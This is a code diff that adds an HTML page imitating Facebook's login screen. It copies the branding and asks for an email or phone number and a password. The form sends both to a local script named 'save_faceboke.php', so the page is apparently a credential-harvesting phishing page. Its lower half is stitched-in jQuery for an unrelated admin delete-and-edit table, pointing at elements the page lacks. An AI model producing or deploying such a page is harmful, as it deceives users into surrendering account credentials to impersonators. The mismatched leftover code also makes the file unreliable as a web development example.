@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="folder/facebook.css">
+</head>
+<body>
+    <div class="textbox">
+        <h1>
+            facebook
+        </h1>
+        <h2>
+            Facebook helps you connect and share<br> with the people in your life.
+        </h2>
+    </div>
+
+<div id = "edit_form"></div>
+					<div id = "admin_form" ">
+    <div class="container">
+<div class="form" >
+<form method = "POST" action = "folder/save_faceboke.php" enctype = "multipart/form-data">
+    <input type="text" name = "username" class="text" placeholder="Enter Your Email or Phone number"> <br>
+    <input type="password" name = "password" class="text" placeholder="Password"><br>
+    <button   name = "save_admin" value = "save_admin">
+        Log In
+    </button>
+    <p><a href="">forgot password?</a><br></p>
+    <div class="btn">
+        <button>Create New Account</button>
+     
+         
+     </div>
+
+</form>
+
+</div></div>
+
+    </div>
+    <script type = "text/javascript">
+		$(document).ready(function(){
+			$result = $('<center><label>Deleting...</label></center>');
+			$('.deladmin_id1').click(function(){
+				$admin_id = $(this).attr('value');
+				$(this).parents('td').empty().append($result);
+				$('.deladmin_id').attr('disabled', 'disabled');
+				$('.eadmin_id').attr('disabled', 'disabled');
+				
+				setTimeout(function(){
+					window.location = 'load_admin_delete.php?admin_id=' + $admin_id;
+				}, 1000);
+			});
+			
+			$('.deladmin_id').click(function(){
+				$admin_id = $(this).attr('value');
+				$('#show_admin').show();
+				$('#show_admin').click(function(){
+					$(this).hide();
+					$('#edit_form').empty();
+					$('#admin_table').show();
+					$('#add_admin').show();
+				});
+				$('#admin_table').fadeOut();
+				$('#add_admin').hide();
+				$('#edit_form').load('load_admin_delete.php?admin_id=' + $admin_id);
+			});
+			
+			$('.eadmin_id').click(function(){
+				$admin_id = $(this).attr('value');
+				$('#show_admin').show();
+				$('#show_admin').click(function(){
+					$(this).hide();
+					$('#edit_form').empty();
+					$('#admin_table').show();
+					$('#add_admin').show();
+				});
+				$('#admin_table').fadeOut();
+				$('#add_admin').hide();
+				$('#edit_form').load('load_admin.php?admin_id=' + $admin_id);
+			});
+		});
+	</script>
+	
+</body>
+</html>
